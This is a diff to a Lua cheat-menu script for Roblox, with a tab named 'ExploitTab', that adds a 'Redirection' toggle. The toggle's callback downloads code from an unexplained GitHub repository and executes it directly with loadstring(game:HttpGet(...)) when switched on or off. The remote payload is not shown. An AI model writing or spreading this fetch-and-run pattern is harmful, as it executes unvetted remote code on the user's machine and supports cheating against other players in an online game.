@@ -198,3 +198,16 @@ local Slider = ExploitTab:CreateSlider({
        currentSpeed = Value
    end,
 })
+
+local Toggle = ExploitTab:CreateToggle({
+    Name = "Redirection",
+    CurrentValue = false,
+    Flag = "Toggle10",
+    Callback = function(Value)
+        if Value then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/chuu4y-crypto/bdsbsbsdbsdhg/refs/heads/main/redi%20on"))() 
+        else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/chuu4y-crypto/bdsbsbsdbsdhg/refs/heads/main/redi%20off"))()
+        end
+    end,
+})
